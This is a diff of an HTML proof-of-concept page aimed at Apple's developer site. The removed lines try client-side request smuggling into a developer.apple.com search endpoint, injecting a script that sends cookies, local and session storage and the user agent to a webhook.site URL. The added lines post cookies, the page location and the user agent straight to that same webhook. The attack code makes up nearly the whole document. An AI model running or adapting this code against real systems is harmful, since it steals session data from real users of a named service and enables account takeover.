@@ -1,41 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Apple CSD XSS PoC</title>
+  <meta charset="utf-8">
+  <title>Apple XSS PoC</title>
 </head>
 <body>
-  <h1 style="color: red;">🍎 Apple CSD + XSS Exploit — PoC</h1>
-  <p>If you see no popup, open developer tools and monitor the network + Webhook logs.</p>
-
+  <h2>Testing Apple XSS</h2>
   <script>
-    // بيانات سيتم تهريبها إلى Apple عبر CSD
-    const smuggled = "\r\n\r\n" +
-      "HTTP/1.1 200 OK\r\n" +
-      "Content-Type: text/html\r\n" +
-      "Content-Length: 500\r\n\r\n" +
-      `<script>
-        fetch('https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b', {
-          method: 'POST',
-          body: JSON.stringify({
-            cookie: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            userAgent: navigator.userAgent
-          })
-        });
-        alert("✅ Apple XSS Triggered!");
-      <\/script>`;
-
-    // الطلب POST المهرب إلى Apple
-    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
+    // تجاوز CSP: استخدام مصدر مسموح به
+    fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
       method: "POST",
-      mode: "no-cors", // نتجاوز القيود مؤقتًا للتهريب
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "q=aaa" + smuggled
+      mode: "no-cors",
+      body: document.cookie + "\n" + document.location + "\n" + navigator.userAgent
     });
+    alert("XSS ✅ on Apple");
   </script>
 </body>
 </html>
